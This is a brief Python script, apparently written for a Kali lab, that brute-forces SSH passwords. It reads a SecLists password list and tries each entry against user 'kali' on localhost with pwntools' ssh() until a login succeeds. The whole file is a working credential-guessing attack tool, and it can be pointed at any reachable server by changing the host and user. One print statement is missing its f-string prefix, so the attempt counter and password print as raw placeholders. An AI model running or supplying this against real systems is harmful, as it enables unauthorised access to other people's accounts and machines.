from pwn import*
import paramiko

host = "127.0.0.1"
user = "kali"
attempt = 0

with open('/home/kali/SecLists/Passwords/xato-net-10-million-passwords-10.txt', 'r') as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{attempt}] Attempting password '{password}' !")
            response = ssh(host=host, user=user, password=password, timeout=1)
            if response.connected():
                print(f"[<>] Valid Password: {password}")
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password")
        attempt+=1

